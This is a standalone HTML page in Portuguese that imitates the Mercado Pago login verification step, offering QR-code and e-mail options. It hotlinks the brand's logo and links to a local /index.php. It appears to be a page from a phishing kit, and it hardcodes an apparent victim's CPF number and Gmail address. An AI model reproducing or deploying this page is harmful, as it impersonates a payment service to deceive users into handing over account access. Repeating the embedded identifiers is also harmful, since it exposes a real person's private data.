<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Escolha um método de verificação</title>
    <style>
        /* Reset básico e estilos do Body */
        body {
            margin: 0;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif; 
            display: flex;
            flex-direction: column;
            min-height: 100vh;
            background-color: #f5f5f5; 
        }

        /* Estilo do cabeçalho principal */
        .main-header {
            background-color: #ffe600;
            padding: 0 680px;
            box-shadow: 0 1px 2px 0 rgba(0,0,0,.1);
            height: 60px;
            display: flex;
            align-items: center;
            justify-content: flex-start;
        }

        .main-header img {
            height: 37px;
            vertical-align: middle;
        }

        /* --- ESTILOS DO CONTEÚDO PRINCIPAL --- */
        .main-content {
            display: flex;
            justify-content: center; 
            align-items: flex-start; 
            padding-top: 80px; 
            gap: 80px; 
            flex-grow: 1;
        }
        
        .left-column {
            display: flex;
            flex-direction: column;
            flex-basis: 340px;
            flex-shrink: 0;
        }

        .session-start-label {
            font-size: 12px;
            font-weight: 600;
            color: #555;
            margin-bottom: 8px;
        }

        .main-title {
            font-size: 28px;
            font-weight: 400;
            color: #333;
            line-height: 1.25;
            margin: 0; 
        }
        
        /* --- ESTILOS ATUALIZADOS PARA O CARD DE USUÁRIO --- */
        .user-identifier-box {
            display: flex;
            align-items: center;
            gap: 16px; /* Aumenta o espaço entre o ícone e o texto */
            background-color: #f5f5f5; /* Cor de fundo mais clara como na imagem */
            border-radius: 8px; /* Bordas mais arredondadas */
            padding: 16px;
            margin-top: 32px;
        }

        /* Novo container para o texto empilhado */
        .identifier-text-block {
            display: flex;
            flex-direction: column;
        }

        .identifier-text-block .cpf-text {
            font-size: 16px;
            font-weight: 400; /* Peso normal */
            color: #333;
        }

        .identifier-text-block .change-account-link {
            font-size: 14px;
            color: #3483fa;
            text-decoration: none;
            margin-top: 4px; /* Pequeno espaço entre os textos */
        }
        .identifier-text-block .change-account-link:hover { text-decoration: underline; }


        .help-link {
            display: block;
            margin-top: 24px;
            color: #3483fa;
            text-decoration: none;
            font-size: 14px;
            font-weight: 500;
        }
        .help-link:hover { text-decoration: underline; }
        
        /* Direita (Card de Verificação) */
        .verification-card {
            width: 100%;
            max-width: 500px;
            background-color: #fff;
            box-shadow: 0 1px 4px 0 rgba(0,0,0,.1);
            border-radius: 6px;
            padding: 16px 0;
            box-sizing: border-box;
        }
        /* ... outros estilos ... */
        .verification-option { display: flex; align-items: center; gap: 16px; padding: 16px 24px; text-decoration: none; color: inherit; border-bottom: 1px solid #ededed; }
        .verification-option:last-of-type { border-bottom: none; }
        .verification-option .icon-container { width: 40px; height: 40px; border-radius: 50%; background-color: #e3edff; display: flex; align-items: center; justify-content: center; }
        .verification-option .text-content h3 { margin: 0 0 4px 0; font-size: 16px; font-weight: 500; }
        .verification-option .text-content p { margin: 0; font-size: 14px; color: #555; }
        .verification-option .chevron-icon { margin-left: auto; }
        .cant-login-link { display: block; text-align: center; color: #3483fa; text-decoration: none; font-size: 15px; font-weight: 500; padding: 24px; border-top: 1px solid #ededed; }
        .cant-login-link:hover { text-decoration: underline; }
    </style>
</head>
<body>

    <header class="main-header">
        <img src="https://http2.mlstatic.com/storage/mobile-on-demand-resources/image/web-private-nav-mp-logo_1X?updatedAt=1746639317789" alt="Mercado Pago">
    </header>

    <main class="main-content">
        
        <div class="left-column">
            <span class="session-start-label">INÍCIO DE SESSÃO</span>
            <h1 class="main-title">Escolha um método de verificação para iniciar sessão</h1>
            
            <div class="user-identifier-box">
                <svg aria-hidden="true" width="24" height="24" viewBox="0 0 24 24" fill="#333"><path fill-rule="evenodd" clip-rule="evenodd" d="M11.999 15.75C15.7275 15.75 18.75 12.7275 18.75 8.999C18.75 5.27053 15.7275 2.248 11.999 2.248C8.27053 2.248 5.248 5.27053 5.248 8.999C5.248 12.7275 8.27053 15.75 11.999 15.75ZM11.999 14.25C9.09895 14.25 6.748 11.899 6.748 8.999C6.748 6.09895 9.09895 3.748 11.999 3.748C14.899 3.748 17.25 6.09895 17.25 8.999C17.25 11.899 14.899 14.25 11.999 14.25Z" fill="currentColor"></path><path d="M5.98045 18.75C4.74861 18.75 3.75 19.7486 3.75 20.9804V21.7304H2.25V20.9804C2.25 18.9202 3.92018 17.25 5.98045 17.25H18C20.0711 17.25 21.75 18.9289 21.75 21V21.75H20.25V21C20.25 19.7574 19.2426 18.75 18 18.75H5.98045Z" fill="currentColor"></path></svg>
                
                <div class="identifier-text-block">
                    <span class="cpf-text">CPF: 288.114.198-67</span>
                    <a href="/index.php" class="change-account-link">Trocar conta</a>
                </div>
            </div>

            <a href="#" class="help-link">Preciso de ajuda</a>
        </div>

        <div class="verification-card">
            <a href="#" class="verification-option">
                <div class="icon-container">
                    <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M3 11H11V3H3V11ZM5 5H9V9H5V5Z" fill="#3483fa"/><path d="M3 21H11V13H3V21ZM5 15H9V19H5V15Z" fill="#3483fa"/><path d="M13 3V11H21V3H13ZM19 9H15V5H19V9Z" fill="#3483fa"/><path d="M13 13H15V15H13V13Z" fill="#3483fa"/><path d="M15 15H17V17H15V15Z" fill="#3483fa"/><path d="M13 17H15V19H13V17Z" fill="#3483fa"/><path d="M15 17H17V19H15V17Z" fill="#3483fa"/><path d="M17 17H19V19H17V17Z" fill="#3483fa"/><path d="M19 17H21V19H19V17Z" fill="#3483fa"/><path d="M17 15H19V17H17V15Z" fill="#3483fa"/><path d="M19 15H21V17H19V15Z" fill="#3483fa"/><path d="M17 13H19V15H17V13Z" fill="#3483fa"/><path d="M19 13H21V15H19V13Z" fill="#3483fa"/></svg>
                </div>
                <div class="text-content">
                    <h3>Código QR</h3>
                    <p>Você vai escanear o código com a câmera do seu celular ou pelo app do Mercado Pago.</p>
                </div>
                <div class="chevron-icon">
                    <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#3483fa" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="9 18 15 12 9 6"></polyline></svg>
                </div>
            </a>
            
            <a href="#" class="verification-option">
                <div class="icon-container">
                    <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M4 4H20C21.1 4 22 4.9 22 6V18C22 19.1 21.1 20 20 20H4C2.9 20 2 19.1 2 18V6C2 4.9 2.9 4 4 4Z" stroke="#3483fa" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/><path d="M22 6L12 13L2 6" stroke="#3483fa" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg>
                </div>
                <div class="text-content">
                    <h3>E-mail</h3>
                    <p>Vamos enviar um código para nivaldaalmeida22@gmail.com.</p>
                </div>
                <div class="chevron-icon">
                    <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#3483fa" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="9 18 15 12 9 6"></polyline></svg>
                </div>
            </a>
            
            <a href="#" class="cant-login-link">Não consigo iniciar sessão</a>
        </div>
    </main>

</body>
</html>